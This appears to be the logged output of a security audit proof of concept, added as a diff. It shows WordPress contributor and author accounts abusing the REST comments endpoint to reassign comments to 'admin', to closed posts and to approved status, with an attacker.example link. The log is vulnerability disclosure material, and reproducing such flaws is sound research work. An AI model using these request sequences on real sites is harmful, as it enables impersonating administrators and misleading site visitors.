@@ -1,0 +1,44 @@
+### roles ###
+  contributor contributor
+  author author
+  contributor caps: edit_posts=1 | moderate_comments in role: False | edit_others_posts: False
+  author caps: moderate_comments: False
+
+### A. Contributor -> forged 'admin' note on the administrator's page ###
+  administrator's page id = 7; contributor's own draft id = 8
+  [1] contributor: POST /wp/v2/comments {post: <admin page>, type: note}  (baseline)
+    HTTP 403  {"code": "rest_cannot_create_note", "message": "Sorry, you are not allowed to create notes for this post.", "data": {"status": 403}}
+  [2] contributor: POST /wp/v2/comments {post: <own draft>, type: note}
+    HTTP 201  {"id": 2, "post": 8, "parent": 0, "author": 4, "author_name": "contributor", "author_url": "", "date": "2026-09-02T04:41:03", "date_gmt": "2026-09-02T04:41:03", "content": {"rendered": "<p>staging</p>\n"}, "link": "http://localhost:8372/?p=8#comment-2", "status": "approved", "type": "note", "author_
+  [3] contributor: POST /wp/v2/comments/2 {author:1, author_name:'admin', post:<admin page>, content:...}
+    HTTP 200  {"id": 2, "post": 7, "parent": 0, "author": 1, "author_name": "admin", "author_email": "admin@example.test", "author_url": "http://localhost:8372", "author_ip": "127.0.0.1", "author_user_agent": "wp71-audit", "date": "2026-01-05T09:00:00", "date_gmt": "2026-01-05T09:00:00", "content": {"rendered": "
+  [4] database state:
+      comment_ID	comment_post_ID	user_id	comment_author	comment_type	comment_approved
+2	7	1	admin	note	1
+  [5] administrator reads the notes on their own page
+    HTTP 200  [{"id": 2, "post": 7, "parent": 0, "author": 1, "author_name": "admin", "author_email": "admin@example.test", "author_url": "http://localhost:8372", "author_ip": "127.0.0.1", "author_user_agent": "wp71-audit", "date": "2026-01-05T09:00:00", "date_gmt": "2026-01-05T09:00:00", "content": {"rendered": 
+  [6] contributor can no longer touch it (one-shot move)
+    HTTP 403  {"code": "rest_cannot_edit", "message": "Sorry, you are not allowed to edit this comment.", "data": {"status": 403}}
+  [7] note is NOT public (checked, so the write-up does not overstate): False
+
+### B. Author -> approved public comment on a comments-CLOSED post, as 'admin' ###
+  editor's closed post id = 10; author's own post id = 12
+  [1] author: POST /wp/v2/comments {post: <closed post>}  (baseline)
+    HTTP 403  {"code": "rest_comment_closed", "message": "Sorry, comments are closed for this item.", "data": {"status": 403}}
+  [2] author: POST /wp/v2/comments {post: <own post>}
+    HTTP 201  {"id": 3, "post": 12, "parent": 0, "author": 3, "author_name": "author", "author_url": "", "date": "2026-09-02T04:41:04", "date_gmt": "2026-09-02T04:41:04", "content": {"rendered": "<p>staging</p>\n"}, "link": "http://localhost:8372/?p=12#comment-3", "status": "approved", "type": "comment", "author_
+  [3] author: POST /wp/v2/comments/3 {author:1, author_name:'admin', status:'approved', post:<closed post>}
+    HTTP 200  {"id": 3, "post": 10, "parent": 0, "author": 1, "author_name": "admin", "author_email": "admin@example.test", "author_url": "https://attacker.example", "author_ip": "127.0.0.1", "author_user_agent": "wp71-audit", "date": "2026-09-02T04:41:04", "date_gmt": "2026-09-02T04:41:04", "content": {"rendered
+  [4] database state:
+      comment_ID	comment_post_ID	user_id	comment_author	comment_author_url	comment_type	comment_approved
+3	10	1	admin	https://attacker.example	comment	1
+  [5] anonymous: GET /wp/v2/comments?post=<closed post>
+    HTTP 200  [{"id": 3, "post": 10, "parent": 0, "author": 1, "author_name": "admin", "author_url": "https://attacker.example", "date": "2026-09-02T04:41:04", "date_gmt": "2026-09-02T04:41:04", "content": {"rendered": "<p>FORGED-COMMENT Official notice from the site owner.</p>\n"}, "link": "http://localhost:8372
+  [6] rendered front end of the comments-closed post contains the forged comment: True
+      HTML> <ol class="wp-block-comment-template"><li id="comment-3" class="comment byuser comment-author-admin even thread-even depth-1">
+      HTML> <div class="wp-block-comment-author-name"><a rel="external nofollow ugc" href="https://attacker.example" target="_self" >admin</a></div>
+      HTML> <div class="wp-block-comment-content"><p>FORGED-COMMENT Official notice from the site owner.</p>
+
+### C. Subscriber cannot do this (lower bound on the required role) ###
+  subscriber: POST /wp/v2/comments {type:note} on own... (no posts)
+    HTTP 403  {"code": "rest_cannot_create_note", "message": "Sorry, you are not allowed to create notes for this post.", "data": {"status": 403}}
